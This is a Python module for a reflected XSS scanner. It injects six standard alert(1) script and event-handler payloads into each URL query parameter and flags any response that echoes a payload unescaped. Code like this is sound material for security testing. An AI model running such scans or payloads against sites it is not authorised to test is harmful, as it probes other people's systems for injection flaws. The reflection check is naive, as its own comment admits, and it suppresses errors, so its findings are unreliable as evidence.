
import logging
import urllib.parse
from typing import List, Dict, Any

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "' onmouseover='alert(1)"
]

def run(url: str, session=None, debug: bool=False) -> List[Dict[str, Any]]:
    """
    Standalone robust Reflected XSS scanner.
    Checks if payloads are reflected in the response body without encoding.
    """
    results: List[Dict[str, Any]] = []
    
    if not session:
        import requests
        session = requests.Session()

    parsed = urllib.parse.urlparse(url)
    q_params = urllib.parse.parse_qs(parsed.query)

    if not q_params:
        return results

    if debug:
        print(f"[XSS] Scanning parameters for {url}...")

    for param, values in q_params.items():
        original_value = values[0] if values else ""
        
        for payload in XSS_PAYLOADS:
            new_query = q_params.copy()
            new_query[param] = [payload] # Replace value
            
            injected_qs = urllib.parse.urlencode(new_query, doseq=True)
            target = urllib.parse.urlunparse(parsed._replace(query=injected_qs))
            
            try:
                resp = session.get(target, timeout=10)
                # Check reflection
                # NOTE: naive check. Ideally we check if it is NOT HTML escaped.
                if payload in resp.text:
                    results.append({
                        "type": "Reflected XSS",
                        "parameter": param,
                        "payload": payload,
                        "evidence": {
                            "request_url": target,
                            "response_snippet": f"...{payload}..."
                        },
                        "url": target,
                        "severity": "High"
                    })
                    if debug:
                        print(f"[!] XSS Found: {param}")
            except Exception:
                pass
                
    return results

scan = run
